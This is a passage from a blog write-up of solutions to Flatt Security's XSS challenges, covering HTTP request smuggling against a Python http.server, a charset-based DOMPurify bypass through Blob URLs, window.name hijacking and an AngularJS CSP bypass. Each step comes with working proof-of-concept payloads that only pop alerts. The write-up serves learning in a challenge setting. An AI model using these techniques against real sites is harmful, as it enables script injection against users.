<p>The routing for 404 pages looked interesting as it was reflecting the path as it is without any sanitization even though the <code class="language-plaintext highlighter-rouge">Content-Type</code> for this endpoint is <code class="language-plaintext highlighter-rouge">text/plain</code> it can still be usefull if we can find a way to serve a 404 response instead for the original /api/drafts?id= request.</p>

<p>The <code class="language-plaintext highlighter-rouge">Content-Length</code> request header check looked kinda sus , when we are dealing Python the first thing which comes into my mind is Desync attacks (thanks to @kevin_mizu for his work on this area )</p>

<p>This challenge turned out to be a very similar one as this https://mizu.re/post/twisty-python</p>

<p>The problem , the application checks the <code class="language-plaintext highlighter-rouge">Content-Length</code> to make sure it’s not more than 100. If it’s more than 100 it sends a 413 status code and calls <code class="language-plaintext highlighter-rouge">send_data</code> method which sends back the response. But the connection is never close?</p>

<p>From Mizu’s blogpost <em>So, if the application doesn’t read the body, and the connection isn’t closed (keep-alive), by default http.server will ignore the Content-Length header and interpret the request body as part of the subsequent request.</em></p>

<p>Let’s try the theory</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /shirley HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b777c493-76c8-41e2-b7a2-a04f34d9142a" alt="image" /></p>

<p>In the request logs on the server you can see , we have two requests. The second which is a GET request to the path <code class="language-plaintext highlighter-rouge">/shirley</code> is taken from the request body. So Indeed we can perform desync attack here. Interestingly by sending the same request two times (submit form twice), the second time the index page is loaded it will return the response of the request which was smuggled in the POST body. Thats why you see the <code class="language-plaintext highlighter-rouge">Path /shirley not found</code> reponse in the screenshot above</p>

<p>Btw just an example this how the connection would be close, now if you use the same poc it doesn’t shows only the POST request :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="n">close_connection</span> <span class="o">=</span> <span class="bp">True</span> <span class="o">//</span> <span class="n">I</span> <span class="n">added</span> <span class="n">this</span> <span class="n">line</span>
            <span class="k">return</span>
</code></pre></div></div>

<p>The server allows us to send POST request to any path, so we can make a POST request to the http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint with the smuggled request in the body which should contain the xss payload. Now when the same form is submitted two times, the next time a request to the    /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint is made the response for this will be of the smuggled request which is nothing but the 404 page containing the xss payload.</p>

<p>The below submits the form two times with some time delays, also we are targetting the form to be submitted inside the iframe to make sure everything is carried in the same tab because we want the requests to have the same Connection IDs</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"shirley"</span> <span class="na">style=</span><span class="s">"position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"</span> <span class="na">src=</span><span class="s">"http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>

    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /&lt;textarea&gt;&lt;a/id="&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"&gt; HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">6000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">frames[0].location.href="http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="dl">'</span><span class="p">,</span><span class="mi">4000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>After submitting the form two times which hopefully poisons the response for the /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint. we redirect the frame to the /?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint where the js code will take the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter id and make a fetch call to /api/drafts?id= endpoint which will return <code class="language-plaintext highlighter-rouge">Path /xss payload not found</code> as the response which is what passed to the sanitizer then to the innerHTML sink</p>

<p>Later talking with my friend I got to know we can include more attributes to make it interaction afert  that ,  I noticed that just this is enough to bypass the sanitizer</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;img/id/src/y onerror=alert()&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;img src="" onerror="alert()"&gt;</span><span class="dl">'</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/569a7ea0-1974-4cab-b0be-96d806ae5f35" alt="image" /></p>

<hr />

<h1 id="challenge-3-by-kinugawamasato">Challenge 3 by @kinugawamasato</h1>

<p>Well at first , this challenge looked impossible no matter from what angle I look at it. I mean check the source everything looks really good, that’s all the relevant code for this challenge. The Dompurify config ensures we can’t use any attributes neither <code class="language-plaintext highlighter-rouge">data-*</code> nor <code class="language-plaintext highlighter-rouge">aria-*</code> which is then used to create a blob url and loaded inside an iframe??</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>My friend told me if you look into what the author main area of work is you will soon realize what the challenge is about.
I then looked at the server used to setup the challenge site, it was Python <code class="language-plaintext highlighter-rouge">http.server</code> nothing fancy, when I paid attention to the response header I noticed that it’s <code class="language-plaintext highlighter-rouge">Content-Type: text/html</code> see no charset specified this was a good lead… because I knew from Masato’s blogpost he has done a lot of work on Charset based xss in the past and also recently there was a blogpost related to this from SonarSource plus Mizu also posted a tweet about it.</p>

<p>https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
https://x.com/kevin_mizu/status/1812882499875319959</p>

<p><img src="https://github.com/user-attachments/assets/c0b654ba-7663-43aa-a20b-931d5b41c74b" alt="image" /></p>

<p>Mizu’s screenshot should be self explanatory, when there is no charset specified browser tries to be smart and it tries to guess the charset this is similar to the mime sniffing behaviour where browser tries to guess the Mime type in cases where no <code class="language-plaintext highlighter-rouge">Content-Type</code> header is specified at all.
The SonarSource blogpost explain all this very well so I would recommend reading it if you haven’t already</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"\x1b$B"</span><span class="nt">&gt;&lt;/a&gt;</span>\x1b(B<span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&gt;&lt;img src=x onerror=alert(1)&gt;"</span><span class="nt">&gt;&lt;/a&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">\x1b$B</code> , <code class="language-plaintext highlighter-rouge">\x1b(B</code> are both different escape sequences. You can look at the below diagram which is taken from the same SonarSource blogpost to understand what these escape sequences does</p>

<p><img src="https://github.com/user-attachments/assets/a5f30c3b-3c6d-4a1c-b2f6-1ad6e931b994" alt="image" /></p>

<p>In simple terms , consider the sequence <code class="language-plaintext highlighter-rouge">\x1b$B</code> lets you escape the <code class="language-plaintext highlighter-rouge">"</code> context of the id attribute by ignoring the next <code class="language-plaintext highlighter-rouge">"</code> occurence and by  using this  <code class="language-plaintext highlighter-rouge">\x1b(B</code> escape sequence we make the rest of the part treated as ASCII ,so the browser sees the <code class="language-plaintext highlighter-rouge">img</code> element with <code class="language-plaintext highlighter-rouge">onerror</code> attribute and happily gives us xss.</p>

<p>Coming back to our challenge, as in the Mizu’s tweet we can see it easily allows you bypass Dompurify ,we hide the xss vectors inside attribute. 
Scrolling through Masato’s old tweets my friend found this gold  https://x.com/kinugawamasato/status/1309937578443849730?s=46&amp;t=SSyMk5f3kBs791RxVEILAg
<img src="https://github.com/user-attachments/assets/05f0a6bc-af1a-4b15-a74c-71111817d651" alt="image" /></p>

<p>It’s about a Charset XSS bug in  Blob API due to the ignorance of the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. This allowed Masato to do a similar xss as explained by Mizu and SonarSource.</p>

<p>Here’s poc fron the Chromium bug report:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html;charset=utf-8</span><span class="dl">"</span><span class="c1">//this charset should be used</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>You can see using the <code class="language-plaintext highlighter-rouge">type</code> option, the charset is defined there. But seems Chromium was ignoring it which led to such bypass:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\u001B$@<span class="nt">&lt;textarea&gt;</span>\u001B(B<span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">xss</span><span class="dl">'</span><span class="p">);</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">charset</span><span class="p">)</span><span class="o">&lt;</span><span class="err">\</span><span class="o">/</span><span class="nx">script</span><span class="o">&gt;&lt;</span><span class="sr">/textarea&gt;bb</span><span class="err">b
</span></code></pre></div></div>

<p>Funny enough we came across  <code class="language-plaintext highlighter-rouge">textarea</code> again in the 3rd challenge also, as already discussed content inside of textarea isn’t rendered by the browser so normally the script element should not be rendered.But due charset problem, using the escape sequences in ISO-2022-JP encoding we can make it to ignore the starting <code class="language-plaintext highlighter-rouge">textarea</code> element thus the <code class="language-plaintext highlighter-rouge">script</code> element is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code>. This will allow the script element to be rendered and an alert will popup.</p>

<p>As the reported bug by Masato is fixed, Blob API now respects the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. But still if you want to reproduce it you can omit the <code class="language-plaintext highlighter-rouge">charset</code> attribute and you can replicate the same which is expected to show weird behaviours as we are not specifying a charset:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="c1">//this charset is removed</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>This is how the element gets rendered and we also get the alert popup</p>

<p><img src="https://github.com/user-attachments/assets/926ccbc0-49f7-455f-a56b-ed774143ff3e" alt="image" /></p>

<p>This vector is special because it doesn’t makes the use of any attributes which is what we need for our challenge and if you pay attention in challenge site there also the charset isn’t specified for the Blob API</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/90e38ac5-7726-49a0-bda5-17b8f816ca10" alt="image" /></p>

<p>For style it’s even more strict removes the whole node, similar behaviour we can see for other possible options xmp,plaintext,title,etc</p>

<p><img src="https://github.com/user-attachments/assets/722253fc-a959-4f01-bcd9-02a4963226f1" alt="image" /></p>

<p>I was stuck here for a very long time and at one moment  I randomly started playing with just <code class="language-plaintext highlighter-rouge">&lt;</code>,<code class="language-plaintext highlighter-rouge">&gt;</code> inside of <code class="language-plaintext highlighter-rouge">style</code> element. That’s when I noticed that dompurify only removes the STYLE node upon encountering a closing or a starting element inside the STYLE contents.</p>

<p><img src="https://github.com/user-attachments/assets/70e4254c-0469-45b8-a88a-61215a91dfc6" alt="image" /></p>

<p>Now all I needed to do was find  a way to put something in place of the space after <code class="language-plaintext highlighter-rouge">&lt;</code> which would remain as it is during Dompurify sanitization process but when rendered by the browser it gets ignored so that it becomes <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> something like a NULL character.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa &lt;style&gt;\u001B(B  &lt; script&gt;alert('xss');alert(document.charset)&lt; /script&gt; &lt;/style&gt; bbb
</code></pre></div></div>

<p>I thought why not just use the escape sequence ? And yeah that turned out to be working so fucking well. This was passed as it is from Dompurify but when rendered by the browser, the script alement appeared as <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> not <code class="language-plaintext highlighter-rouge">&lt;SOMECHARACTERscript&gt;</code> so that was a good sign . I was testing in Firefox at that time and noticed that the same doesn’t works in Chrome</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bsssss</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bscript</span><span class="o">&gt;</span><span class="nt">alert</span><span class="o">(</span><span class="s2">'xss'</span><span class="o">);</span><span class="nt">alert</span><span class="o">(</span><span class="nt">document</span><span class="nc">.charset</span><span class="o">)&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>Give it a try in ff then in chrome</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>Here in this screenshot you can see how both the browsers interpret this differently
<img src="https://github.com/user-attachments/assets/4b9fcb81-72c8-49fe-b806-2a2d81184767" alt="image" /></p>

<p>To make this work in Chrome, the solution is very simple we just need to add <code class="language-plaintext highlighter-rouge">\x1b$B</code> at the starting</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa \x1b$B &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3ae6f1b3-675c-4d4b-bec1-0846d165a390" alt="image" /></p>

<p>Still few more hurdles to solve, if you look at the poc we are using for Blob we are loading the blob url by making a redirect to it. This seems to be necessary we can even see a warning message in firefox when we load this vector in the challenge site. As the blob url is loaded inside an iframe.</p>

<p><em>The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.</em></p>

<p><img src="https://github.com/user-attachments/assets/d7132215-3010-4918-948a-cc02064b1df4" alt="image" /></p>

<p>The blobUrl is loaded like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"iframe"</span> <span class="na">style=</span><span class="s">"width: 80%;height:200px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>window.open targets the url to the iframe element with the name <code class="language-plaintext highlighter-rouge">iframe</code>. After thinking for a while I thought of trying window hijacking, basically the idea is setting the <code class="language-plaintext highlighter-rouge">window.name</code> property to <code class="language-plaintext highlighter-rouge">iframe</code>. So because of this the current top window has the name “iframe” when <code class="language-plaintext highlighter-rouge">window.open(blobURL, "iframe")</code> is executed instead of targetting the iframe it will target the current top window thus making a full redirect to the blobUrl instead of loading it inside the iframe which is what we wantttt.</p>

<p>In Chrome, even for different origins if the tab in which they are opened is same. They all will share the same <code class="language-plaintext highlighter-rouge">window.name</code> property ,this thing doesn’t works in Firefox.</p>

<p>I decided to host the following poc on my site:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">let</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">)</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>And this worked, but now the only task left was to bypass CSP which was fairly easy, as cdnjs.cloudflare.com is in the allowlist we can load angular and bypass the csp completely.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>default-src 'none';script-src 'sha256-EojffqsgrDqc3mLbzy899xGTZN4StqzlstcSYu24doI=' cdnjs.cloudflare.com; style-src 'unsafe-inline'; frame-src blob:
</code></pre></div></div>

<p>This was the final payload which I came up with:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\x1B$@<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bscript</span> <span class="nt">src</span><span class="o">=</span><span class="s1">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js"</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bimg</span><span class="o">/</span><span class="nt">ng-app</span><span class="o">/</span><span class="nt">ng-csp</span><span class="o">/</span><span class="nt">src</span><span class="o">/</span><span class="nt">ng-on-error</span><span class="o">=</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.alert</span><span class="o">(</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.origin</span><span class="o">)&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>By opening this url you will get an alert on the challenge site ;)
https://sudistark.github.io/window-name-redirect.html?name=iframe#aHR0cHM6Ly9jaGFsbGVuZ2Uta2ludWdhd2EucXVpei5mbGF0dC50cmFpbmluZy8/aHRtbD1hYWElMUIkQCUzQ3N0eWxlJTNFJTFCKEIlM0MlMUIoQnNjcmlwdCUyMHNyYz0lMjJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9hbmd1bGFyLmpzLzEuOC4wL2FuZ3VsYXIuanMlMjIlM0UlM0MlMUIoQi9zY3JpcHQlM0UlM0MlMUIoQmltZy9uZy1hcHAvbmctY3NwL3NyYy9uZy1vbi1lcnJvcj0kZXZlbnQudGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuYWxlcnQoJGV2ZW50LnRhcmdldC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Lm9yaWdpbiklM0UlM0Mvc3R5bGUlM0ViYmI=</p>

<p><img src="https://github.com/user-attachments/assets/be4f06b7-b270-47e1-b463-ef57aaaabc6c" alt="image" /></p>

<p>If you come this far reading this thankyou so much I hope you liked reading it and pardon if there are any mistakes lots of new stuff which I got to know during this timespan trying to solve this challenges only , thanks to Flatt Security for creating such awesome challenges I really learned a lot by trying to solve them.</p>

  </div><a class="u-url" href="/2024/12/07/flatt-security-xss-challenge-solutions.html" hidden></a>
</article>

      </div>
